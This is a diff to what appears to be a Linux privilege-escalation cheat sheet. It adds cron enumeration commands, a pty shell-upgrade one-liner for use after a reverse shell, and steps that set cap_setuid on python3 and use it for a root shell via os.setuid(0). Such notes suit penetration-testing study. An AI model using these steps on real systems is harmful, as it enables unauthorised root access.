@@ -434,12 +434,60 @@ LinEnum
 ```
 # CRONJOB ENUMERATION
 ```bash
+# LIST
+crontab -l
+crontab -e # config
+
+0 9 15 2 * script.sh (15th February at 9:00am )
+MIN HOUR DOM MON DOW
+
+MIN -> Minute
+HOUR -> Hour
+DOM -> day of the month
+MON -> Minth
+DOW -> day of the week
+
+# EX
+* * * * * echo "i dont make mistakes" > /tmp/cron_text.txt
+watch -n 1 ls -l /tmp
+
+cat /etc/crontab # example
+
+pspy # view linux prcocesses
+cd /proc
+ps aux
+
+python3 -c 'import pty; pty.spawn("/bin/bash")' # get a better shell after reverse shell
+
+
+
+
+
 
 
 ```
 # CAPABILITITES ENUMERATION
 ```bash
+getcap -r / 2>/dev/null
+getcaps <PID>
+cat /proc/<PID>/status | grep Cap
+ 
+# ADDING CAPABILITIES BY (S4VI)
+ls -l /usr/bin/python3 # check symbolic links
+# ans
+0 lrwxrwxrwx 1 root root 10 Nov 30 23:16 /usr/bin/python3 -> python3.13
 
+setcap cap_setuid+ep /usr/bin/python3 # like root
+getcap /usr/bin/python3.13 
+# ans
+/usr/bin/python3.13 cap_setuid=ep
+
+# EXPLOIT
+getcap -r / 2>/dev/null
+# ans
+/usr/bin/python3.13 cap_setuid=ep
+
+python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")' # one liner
 
 ```
 # LOCAL SERVICE EXPLOTATION
